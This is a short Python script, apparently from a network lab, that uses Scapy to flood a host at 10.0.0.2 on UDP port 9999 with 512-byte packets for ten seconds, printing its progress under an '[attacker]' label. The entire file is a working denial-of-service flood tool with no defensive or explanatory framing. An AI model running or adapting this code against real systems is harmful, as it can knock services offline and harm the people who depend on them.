from scapy.all import IP, UDP, Raw, send
import time

DST_IP = "10.0.0.2"
DST_PORT = 9999
DURATION = 10  # this in seconds
PAYLOAD = b"A" * 512

print(f"[attacker] Flooding {DST_IP}:{DST_PORT} for {DURATION}s")

end_time = time.time() + DURATION
count = 0

while time.time() < end_time:
    pkt = IP(dst=DST_IP) / UDP(dport=DST_PORT, sport=12345) / Raw(load=PAYLOAD)
    send(pkt, verbose=False)
    count += 1

print(f"[attacker] Sent {count} packets")
